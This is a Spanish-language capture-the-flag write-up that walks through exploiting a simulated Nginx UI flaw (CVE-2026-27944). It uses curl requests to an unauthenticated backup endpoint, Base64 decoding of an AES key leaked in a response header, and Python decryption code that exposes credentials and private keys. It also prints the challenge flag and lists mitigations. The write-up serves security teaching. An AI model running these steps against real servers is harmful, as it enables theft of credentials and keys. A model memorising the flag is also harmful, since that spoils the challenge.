# Writeup — Nginx UI: Phantom Backup

## Resumen

Este reto simula **CVE-2026-27944**, una vulnerabilidad crítica (CVSS 9.8) en Nginx UI versiones anteriores a 2.3.3. La vulnerabilidad consiste en:

1. El endpoint `/api/backup` no requiere autenticación
2. La clave de descifrado AES se filtra en el header `X-Backup-Security`

## Pasos de explotación

### Paso 1: Reconocimiento

Al acceder a la aplicación vemos un panel de login de **Nginx UI**. Revisamos el health endpoint público:

```bash
curl http://localhost:9000/api/system/health
```

Respuesta:
```json
{"status": "ok", "version": "2.3.2", "uptime": "14d 3h 22m"}
```

La versión **2.3.2** es anterior a 2.3.3, lo que indica que podría ser vulnerable a CVE-2026-27944.

### Paso 2: Descubrir el endpoint vulnerable

Probamos acceder al endpoint de backup sin autenticación:

```bash
curl -v http://localhost:9000/api/backup -o backup.enc
```

El servidor devuelve un archivo binario (200 OK) en vez de un 401 Unauthorized. Esto confirma la vulnerabilidad.

### Paso 3: Extraer las claves del header

En los headers de respuesta encontramos:

```
X-Backup-Security: eyJhbGdvcml0aG0iOiAiQUVTLTI1Ni1DQkMiLCAia2V5IjogIjRlNmY3NDIwNzM2ZjIwNzM2NTYzNzI2NTc0MjEyMTBhIiwgIml2IjogIi4uLiIsICJpbnRlZ3JpdHkiOiAiLi4uIn0=
```

Decodificamos el Base64:

```bash
echo "eyJhbGdvcml0aG0i..." | base64 -d
```

Obtenemos un JSON con:
- `algorithm`: AES-256-CBC
- `key`: la clave AES en hexadecimal
- `iv`: el vector de inicialización en Base64
- `integrity`: hash SHA-256 del backup original

### Paso 4: Descifrar el backup

El archivo está cifrado con AES-256-CBC. Los primeros 16 bytes del archivo son el IV, seguido del ciphertext con padding PKCS7.

```python
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
key = bytes.fromhex(KEY_HEX)
iv = encrypted_data[:16]
cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
decryptor = cipher.decryptor()
plaintext = decryptor.update(encrypted_data[16:]) + decryptor.finalize()
# Quitar padding PKCS7
```

### Paso 5: Extraer el ZIP y encontrar la flag

El resultado descifrado es un archivo ZIP que contiene:
- `manifest.json`
- `users.json` — credenciales de usuario (hashes, tokens API)
- `certificates.json` — certificados SSL y claves privadas
- `nginx_configs.json` — configuraciones de Nginx
- `audit_log.json` — registro de auditoría

La flag se encuentra dentro de `certificates.json`, en el campo `private_key` del dominio `flag.internal`:

```
-----BEGIN FLAG PRIVATE KEY-----
flag{CVE-2026-27944_unauth_backup_l3ak_n1nxUI_cr1t1c4l}
-----END FLAG PRIVATE KEY-----
```

## Solución automática

```bash
cd solution
pip install -r requirements.txt
python solve.py --target http://localhost:9000
```

## Flag

```
flag{CVE-2026-27944_unauth_backup_l3ak_n1nxUI_cr1t1c4l}
```

## Mitigación real

- Actualizar Nginx UI a la versión **2.3.3** o superior
- Nunca exponer claves criptográficas en headers HTTP
- Aplicar autenticación a TODOS los endpoints de la API
- Implementar rate limiting en endpoints sensibles
